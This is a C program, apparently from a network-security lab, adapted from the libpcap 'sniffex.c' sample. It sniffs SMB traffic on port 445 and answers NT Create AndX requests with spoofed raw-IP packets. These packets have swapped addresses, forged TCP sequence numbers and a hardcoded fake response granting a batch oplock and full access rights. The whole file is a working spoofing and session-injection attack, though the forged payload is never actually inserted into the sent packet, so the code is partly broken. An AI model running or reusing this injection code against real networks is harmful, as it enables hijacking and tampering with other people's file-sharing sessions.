/*
 * sniffex.c
 *
 * Sniffer example of TCP/IP packet capture using libpcap.
 * 
 * Version 0.1.1 (2005-07-05)
 * Copyright (c) 2005 The Tcpdump Group
 *
 * This software is intended to be used as a practical example and 
 * demonstration of the libpcap library; available at:
 * http://www.tcpdump.org/
 *
 ****************************************************************************
 *
 * This software is a modification of Tim Carstens' "sniffer.c"
 * demonstration source code, released as follows:
 * 
 * sniffer.c
 * Copyright (c) 2002 Tim Carstens
 * 2002-01-07
 * Demonstration of using libpcap
 * timcarst -at- yahoo -dot- com
 * 
 * "sniffer.c" is distributed under these terms:
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 4. The name "Tim Carstens" may not be used to endorse or promote
 *    products derived from this software without prior written permission
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 * <end of "sniffer.c" terms>
 *
 * This software, "sniffex.c", is a derivative work of "sniffer.c" and is
 * covered by the following terms:
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Because this is a derivative work, you must comply with the "sniffer.c"
 *    terms reproduced above.
 * 2. Redistributions of source code must retain the Tcpdump Group copyright
 *    notice at the top of this source file, this list of conditions and the
 *    following disclaimer.
 * 3. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 4. The names "tcpdump" or "libpcap" may not be used to endorse or promote
 *    products derived from this software without prior written permission.
 *
 * THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM.
 * BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
 * FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
 * OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
 * PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
 * OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
 * TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
 * PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
 * REPAIR OR CORRECTION.
 * 
 * IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
 * WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
 * REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
 * INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
 * OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
 * TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
 * YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
 * PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGES.
 * <end of "sniffex.c" terms>
 * 
 ****************************************************************************
 *
 * Below is an excerpt from an email from Guy Harris on the tcpdump-workers
 * mail list when someone asked, "How do I get the length of the TCP
 * payload?" Guy Harris' slightly snipped response (edited by him to
 * speak of the IPv4 header length and TCP data offset without referring
 * to bitfield structure members) is reproduced below:
 * 
 * The Ethernet size is always 14 bytes.
 * 
 * <snip>...</snip>
 *
 * In fact, you *MUST* assume the Ethernet header is 14 bytes, *and*, if 
 * you're using structures, you must use structures where the members 
 * always have the same size on all platforms, because the sizes of the 
 * fields in Ethernet - and IP, and TCP, and... - headers are defined by 
 * the protocol specification, not by the way a particular platform's C 
 * compiler works.)
 *
 * The IP header size, in bytes, is the value of the IP header length,
 * as extracted from the "ip_vhl" field of "struct sniff_ip" with
 * the "IP_HL()" macro, times 4 ("times 4" because it's in units of
 * 4-byte words).  If that value is less than 20 - i.e., if the value
 * extracted with "IP_HL()" is less than 5 - you have a malformed
 * IP datagram.
 *
 * The TCP header size, in bytes, is the value of the TCP data offset,
 * as extracted from the "th_offx2" field of "struct sniff_tcp" with
 * the "TH_OFF()" macro, times 4 (for the same reason - 4-byte words).
 * If that value is less than 20 - i.e., if the value extracted with
 * "TH_OFF()" is less than 5 - you have a malformed TCP segment.
 *
 * So, to find the IP header in an Ethernet packet, look 14 bytes after 
 * the beginning of the packet data.  To find the TCP header, look 
 * "IP_HL(ip)*4" bytes after the beginning of the IP header.  To find the
 * TCP payload, look "TH_OFF(tcp)*4" bytes after the beginning of the TCP
 * header.
 * 
 * To find out how much payload there is:
 *
 * Take the IP *total* length field - "ip_len" in "struct sniff_ip" 
 * - and, first, check whether it's less than "IP_HL(ip)*4" (after
 * you've checked whether "IP_HL(ip)" is >= 5).  If it is, you have
 * a malformed IP datagram.
 *
 * Otherwise, subtract "IP_HL(ip)*4" from it; that gives you the length
 * of the TCP segment, including the TCP header.  If that's less than
 * "TH_OFF(tcp)*4" (after you've checked whether "TH_OFF(tcp)" is >= 5),
 * you have a malformed TCP segment.
 *
 * Otherwise, subtract "TH_OFF(tcp)*4" from it; that gives you the
 * length of the TCP payload.
 *
 * Note that you also need to make sure that you don't go past the end 
 * of the captured data in the packet - you might, for example, have a 
 * 15-byte Ethernet packet that claims to contain an IP datagram, but if 
 * it's 15 bytes, it has only one byte of Ethernet payload, which is too 
 * small for an IP header.  The length of the captured data is given in 
 * the "caplen" field in the "struct pcap_pkthdr"; it might be less than 
 * the length of the packet, if you're capturing with a snapshot length 
 * other than a value >= the maximum packet size.
 * <end of response>
 * 
 ****************************************************************************
 * 
 * Example compiler command-line for GCC:
 *   gcc -Wall -o sniffex sniffex.c -lpcap
 * 
 ****************************************************************************
 *
 * Code Comments
 *
 * This section contains additional information and explanations regarding
 * comments in the source code. It serves as documentaion and rationale
 * for why the code is written as it is without hindering readability, as it
 * might if it were placed along with the actual code inline. References in
 * the code appear as footnote notation (e.g. [1]).
 *
 * 1. Ethernet headers are always exactly 14 bytes, so we define this
 * explicitly with "#define". Since some compilers might pad structures to a
 * multiple of 4 bytes - some versions of GCC for ARM may do this -
 * "sizeof (struct sniff_ethernet)" isn't used.
 * 
 * 2. Check the link-layer type of the device that's being opened to make
 * sure it's Ethernet, since that's all we handle in this example. Other
 * link-layer types may have different length headers (see [1]).
 *
 * 3. This is the filter expression that tells libpcap which packets we're
 * interested in (i.e. which packets to capture). Since this source example
 * focuses on IP and TCP, we use the expression "ip", so we know we'll only
 * encounter IP packets. The capture filter syntax, along with some
 * examples, is documented in the tcpdump man page under "expression."
 * Below are a few simple examples:
 *
 * Expression			Description
 * ----------			-----------
 * ip					Capture all IP packets.
 * tcp					Capture only TCP packets.
 * tcp port 80			Capture only TCP packets with a port equal to 80.
 * ip host 10.1.2.3		Capture all IP packets to or from host 10.1.2.3.
 *
 ****************************************************************************
 *
 */

#define APP_NAME		"sniffex"
#define APP_DESC		"Sniffer example using libpcap"
#define APP_COPYRIGHT	"Copyright (c) 2005 The Tcpdump Group"
#define APP_DISCLAIMER	"THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM."

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
//#include <linux/smb.h>
//#include <linux/ip.h>
//#include <linux/tcp.h>
//#include <net/ethernet.h>

/* default snap length (maximum bytes per packet to capture) */
//#define SNAP_LEN 1518
#define SNAP_LEN 65536

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

/* SMB header */
struct sniff_smb {
	//u_int   smb_nb;			/* netbios */
	u_long  smb_nb;
	#define SMB_SIZE(smb)	(smb->smb_nb & 0xffffff00)	/* SMB length */

	u_int   smb_sc;			/* server component */
	u_char  smb_cmd;		/* smb command */
	u_int   smb_stat;		/* nt status */
	u_char  smb_flg;		/* header flags */
	#define SMB_LAR 0x01
	#define SMB_RBP 0x02
	#define SMB_CS  0x04
        #define SMB_CP  0x08
        #define SMB_OL  0x10
        #define SMB_NOT 0x20
        #define SMB_RR  0x40
	u_short smb_flg2;		/* header flags 2 */
	#define SMB_LNA 0x0001
        #define SMB_EA  0x0002
        #define SMB_SS  0x0004
        #define SMB_COM 0x0008
        #define SMB_SSR 0x0010
        #define SMB_LNU 0x0020
        #define SMB_RP  0x0040
        #define SMB_ESN 0x0080
        #define SMB_DFS 0x0100
        #define SMB_EOR 0x0200
        #define SMB_ECT 0x0400
        #define SMB_US  0x0800
	u_short smb_pidh;		/* process id high */
	u_long  smb_sig;		/* signature */
	u_short smb_rsv;		/* reserved */
	u_short smb_tid;		/* tree id */
        u_short smb_pid;                /* process id */
        u_short smb_uid;                /* user id */
        u_short smb_mid;                /* multiplex id */
};

/* SMB Create AndX Response */
struct sniff_CAXR {
	u_char  smb_wc;			/* word count */
	u_char  smb_axc;                /* andxcommand */
	u_char  smb_res;                /* reserved */
	u_short smb_axo;		/* andxoffset */
	u_char  smb_ol;                 /* oplock level */
	u_short smb_fid;                /* fid */
	u_int   smb_ca;			/* create action */
	u_long  smb_c;			/* created */
	u_long  smb_la;                 /* last access */
	u_long  smb_lw;                 /* last write */
	u_long  smb_ch;                 /* change */
	u_int   smb_fa;			/* file attributes */
	#define SMB_RO  0x00000001
	#define SMB_HID 0x00000002
	#define SMB_SYS 0x00000004
	#define SMB_VOL 0x00000008
	#define SMB_DIR 0x00000010
	#define SMB_ARC 0x00000020
	#define SMB_DEV 0x00000040
	#define SMB_NOR 0x00000080
	#define SMB_TMP 0x00000100
	#define SMB_SPA 0x00000200
	#define SMB_REP 0x00000400
	#define SMB_CMP 0x00000800
	#define SMB_OFF 0x00001000
	#define SMB_CON 0x00002000
	#define SMB_ENC 0x00004000
	u_long  smb_als;		/* allocation size */
	u_long  smb_eof;                /* end of file */
	u_short smb_ipc;		/* ipc state */
	u_char  smb_isdir;		/* is directory */
	u_long  smb_vguid1;             /* volume guid */
	u_long  smb_vguid2;             /* volume guid */
	u_long  smb_svrun;		/* server unique */
	u_int   smb_mar;		/* maximal access rights */
	u_int   smb_gmar;		/* guest maximal access rights */
	u_short smb_bc;			/* byte count */
};

struct sniff_CAXR
*createAndXResponse(u_char *payload, int size_payload);

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void
print_payload(const u_char *payload, int len);

void
print_hex_ascii_line(const u_char *payload, int len, int offset);

void
print_app_banner(void);

void
print_app_usage(void);

/*
 * app name/banner
 */
void
print_app_banner(void)
{

	printf("%s - %s\n", APP_NAME, APP_DESC);
	printf("%s\n", APP_COPYRIGHT);
	printf("%s\n", APP_DISCLAIMER);
	printf("\n");

return;
}

/*
 * print help text
 */
void
print_app_usage(void)
{

	printf("Usage: %s [interface]\n", APP_NAME);
	printf("\n");
	printf("Options:\n");
	printf("    interface    Listen on <interface> for packets.\n");
	printf("\n");

return;
}

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */
void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

	int i;
	int gap;
	const u_char *ch;

	/* offset */
	printf("%05d   ", offset);
	
	/* hex */
	ch = payload;
	for(i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");
	
	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");
	
	/* ascii (if printable) */
	ch = payload;
	for(i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");

return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void
print_payload(const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const u_char *ch = payload;

	if (len <= 0)
		return;

	/* data fits on one line */
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	/* data spans multiple lines */
	for ( ;; ) {
		/* compute current line length */
		line_len = line_width % len_rem;
		/* print line */
		print_hex_ascii_line(ch, line_len, offset);
		/* compute total remaining */
		len_rem = len_rem - line_len;
		/* shift pointer to remaining bytes to print */
		ch = ch + line_len;
		/* add offset */
		offset = offset + line_width;
		/* check if we have line width chars or less */
		if (len_rem <= line_width) {
			/* print last line and get out */
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

return;
}

void send_raw_ip_packet(struct sniff_ip* ip)
{
	struct sockaddr_in dest_info;
	int enable = 1;

	/* Create a raw network socket */
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	/* Set socket option */
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	/* Provide needed information about destination */
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->ip_dst;

	/* Send packet out */
	sendto(sock, ip, ntohs(ip->ip_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
	close(sock);
}

struct sniff_CAXR * createAndXResponse(u_char *payload, int size_payload)
{
	u_char *newpayload =
		"\xa2"		// Word count
		"\xff"		// AndXCommand: No further commands
		"\x00"		// Reserved
		"\x87\x00"		// AndXOffset
		"\x02"		// Oplock level: Batch oplock granted (2)
		"\x44\x44"		// FID		
		"\x01\x00\x00\x00"		// Create action
		"\x3b\x87\x08\x2d\xa7\x7f\xd4\x01"		// Created
		"\x30\xa2\x63\x26\xb7\x7f\xd4\x01"		// Last access
		"\x46\x94\x86\xb5\xb6\x7f\xd4\x01"		// Last write
		"\x46\x94\x86\xb5\xb6\x7f\xd4\x01"		// Change
		"\x20\x00\x00\x00"		// File attributes
		"\x00\x70\x00\x00\x00\x00\x00\x00"		// Allocation size
		"\x22\x6a\x00\x00\x00\x00\x00\x00"		// End of file
		"\x00\x00"		// File type: Disk file or directory
		"\x70\x00"		// IPC state
		"\x00"		// Is directory
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"		// Volume GUID
		"\x00\x00\x00\x00\x00\x00\x00\x00"		// Server unique file ID
		"\xff\x01\x1f\x00"		// Maximal access rights
		"\x00\x00\x00\x00"		// Guest maximal access rights
		"\x00\x00"		// Byte count
	;

	return (struct sniff_CAXR *)newpayload;
}
	


/*
 * dissect/print packet
 */
void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	//const char buffer[1500];
	const char buffer[65536];

	/* declare pointers to packet headers */
	//struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	struct sniff_ip *ip;              /* The IP header */
	struct sniff_tcp *tcp;            /* The TCP header */
	struct sniff_smb *smb;		/* The SMB header */
	u_char *payload;                    /* Packet payload */

	int size_ip;
	int size_tcp;
	int size_smb;
	int size_payload;
	
	/* define ethernet header */
	//ethernet = (struct sniff_ethernet*)(packet);
	
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* define/compute tcp header offset */
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}

	/* print source and destination IP addresses and ports */
	printf("\n\n       From: %s:%d\n", inet_ntoa(ip->ip_src), ntohs(tcp->th_sport));
	printf("         To: %s:%d\n", inet_ntoa(ip->ip_dst), ntohs(tcp->th_dport));

	
	/* define/compute smb header offset */
	smb = (struct sniff_smb*)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	size_smb = 36;
	size_payload = ntohl(SMB_SIZE(smb)) + 4 - size_smb;

	/* define/compute smb payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp + size_smb);

	/* compute smb payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp + size_smb);

	/* Make a copy from the original packet */
	//memset((char*)buffer, 0, 1500);
	memset((char*)buffer, 0, 65536);
	memcpy((char*)buffer, ip, ntohs(ip->ip_len));
	//printf("\nMem location origin: %x\n",(u_int*)ip);
	//printf("Mem location copy: %x\n",buffer);
	//printf("\nIP_LEN: %u\n", ntohs(ip->ip_len));
	struct sniff_ip *newip = (struct sniff_ip *) buffer;
	struct sniff_tcp *newtcp = (struct sniff_tcp *) ((u_char *)buffer + size_ip);
	struct sniff_smb *newsmb = (struct sniff_smb *) ((u_char *)buffer + size_ip + size_tcp); 
	char *newpayload;

	/* Construct IP header, TCP header, and SMB header */
	newip->ip_src = ip->ip_dst; 
	newip->ip_dst = ip->ip_src;

	int tcp_seg_len = (ntohs(ip->ip_len) - size_ip - size_tcp);
	newtcp->th_sport = tcp->th_dport;
	newtcp->th_dport = tcp->th_sport;
	newtcp->th_seq = tcp->th_ack;
	newtcp->th_ack = htonl(ntohl(tcp->th_seq) + tcp_seg_len);

	//printf("\nOld src: %s   New src: %s\n", inet_ntoa(ip->ip_src), inet_ntoa(newip->ip_src));
	//printf("Old dst: %s   New dst: %s\n", inet_ntoa(ip->ip_dst), inet_ntoa(newip->ip_dst));
        //printf("\nOld sport: %u   New sport: %u\n", ntohs(tcp->th_sport), ntohs(newtcp->th_sport));
        //printf("Old dport: %u   New dport: %u\n", ntohs(tcp->th_dport), ntohs(newtcp->th_dport));

	printf("\nOld seq: %u	New seq: %u\n", ntohl(tcp->th_seq), ntohl(newtcp->th_seq));
	printf("Old ack: %u   New ack: %u\n", ntohl(tcp->th_ack), ntohl(newtcp->th_ack));

	if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_dport) == 445)
	{
		newpayload = createAndXResponse(payload, size_payload);
		printf("\n%u\n", (size_ip + size_tcp + size_smb + size_payload));
		print_payload(newip, size_ip + size_tcp + size_smb + size_payload);
		send_raw_ip_packet(newip);
	}
	/*if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_sport) == 445)
	{
		print_payload(ip, size_ip + size_tcp + size_smb + size_payload);
	}*/

	/* Send packet out */
	//send_raw_ip_packet(newip);
}

int main(int argc, char **argv)
{

	char *dev = NULL;			/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */

	char filter_exp[] = "port 445";		/* filter expression [3] */
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */

	print_app_banner();

	/* check for capture device name on command-line */
	if (argc == 2) {
		dev = argv[1];
	}
	else if (argc > 2) {
		fprintf(stderr, "error: unrecognized command-line options\n\n");
		print_app_usage();
		exit(EXIT_FAILURE);
	}
	else {
		/* find a capture device if not specified on command-line */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n",
			    errbuf);
			exit(EXIT_FAILURE);
		}
	}
	
	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	printf("Device: %s\n", dev);
	//printf("Number of packets: %d\n", num_packets);
	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* now we can set our callback function */
	pcap_loop(handle, -1, got_packet, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);

	printf("\nCapture complete.\n");

return 0;
}

